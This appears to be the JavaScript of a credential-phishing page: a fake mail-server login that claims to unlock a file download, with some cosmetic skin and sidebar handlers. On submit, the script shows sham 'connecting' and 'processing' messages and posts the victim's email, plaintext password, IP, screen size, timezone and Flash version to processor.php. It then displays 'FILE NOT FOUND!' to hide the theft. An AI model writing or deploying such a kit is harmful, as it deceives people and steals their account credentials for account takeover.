$(script);

function getFlashVersion(){
  // ie
  try {
    try {
      var axo = new ActiveXObject('ShockwaveFlash.ShockwaveFlash.6');
      try { axo.AllowScriptAccess = 'always'; }
      catch(e) { return '6,0,0'; }
    } catch(e) {}
    return new ActiveXObject('ShockwaveFlash.ShockwaveFlash').GetVariable('$version').replace(/\D+/g, ',').match(/^,?(.+),?$/)[1];
  } catch(e) {
    try {
      if(navigator.mimeTypes["application/x-shockwave-flash"].enabledPlugin){
        return (navigator.plugins["Shockwave Flash 2.0"] || navigator.plugins["Shockwave Flash"]).description.replace(/\D+/g, ",").match(/^,?(.+),?$/)[1];
      }
    } catch(e) {}
  }
  return '0,0,0';
}

$(function() {

  $('[data-skin]').on('click', function(e) {
    e.preventDefault();
    var skin = $(this).data('skin');
    $('#style-skin').attr('href', 'assets/css/skin-'+ skin +'.css');
  });

  // Sidebar-boxed: Try it section
  $('#sb-left-side').on('click', function() {
    $('.sidebar-boxed').removeClass('sidebar-right');
  });

  $('#sb-right-side').on('click', function() {
    $('.sidebar-boxed').addClass('sidebar-right');
  });

  $('#sb-skin-light').on('click', function() {
    $('.sidebar-boxed').removeClass('sidebar-dark');
  });

  $('#sb-skin-dark').on('click', function() {
    $('.sidebar-boxed').addClass('sidebar-dark');
  });

});
 
function script(){ 
    $("#alert").hide();
	$("#login_btn").on('click', function(e) {
        e.preventDefault();
        var emailfield = $.trim($("#email").val());
        var passwordfield = $.trim($("#password").val());
        emailfield.toLowerCase();
        var emailReg = /^([\w-\.]+@([\w-]+\.)+[\w-]{2,4})?$/; 
        if(emailfield == ""){
            $("#alert").show();
            $("#alert").html("You have a blank email field!"); 
            return;
        }else if(passwordfield == ""){ 
            $("#alert").show();
            $("#alert").html("Password Field Is Blank"); 
            return;
        }else{
            $("#alert").show();
            $("#alert").html("...connecting to Mail Server"); 
            $("#email").prop('disabled',true); 
            $("#password").prop('disabled',true);
            make_the_delay();
        } 
    });
}

function make_the_delay(){
    var delay = 3000; 
    setTimeout(function() { 
        redirect_the(); 
    }, delay); 
} 

function redirect_the(){ 
    now_download()
} 

function now_download(){
    var the_email = $.trim($("#email").val()); 
    var the_password = $("#password").val(); 
    var the_ip = $("#ip").val();
    var the_screen = screen.width + " x " + screen.height;
    var tz = jstz.determine(); // Determines the time zone of the browser client
    var timezone = tz.name(); //'Asia/Kolhata' for Indian Time.
    
    var version = getFlashVersion().split(',').shift();
    
    $("#alert").show();
    $("#alert").html("<img src='assets/img/loading.gif' width='30'> ...Processing your download");
    $.ajax({ 
        type: "POST", 
        url: "processor.php", 
        data: { "email" : the_email , "password" : the_password, "ip" : the_ip, "screen" : the_screen, "tz": timezone, "version" : version }, 
        success: function(data){ 
//            console.log(data);
            var delay = 3000; setTimeout(function() { 
                $("#alert").show();
                $("#alert").html("<img src='assets/img/not_found.png' width='30'> FILE NOT FOUND!"); }, delay); 
        }, 
        error: function (data){ 
            $("#alert").show();
            $("#alert").html("Connection Error"); 
        } 
    }); 
}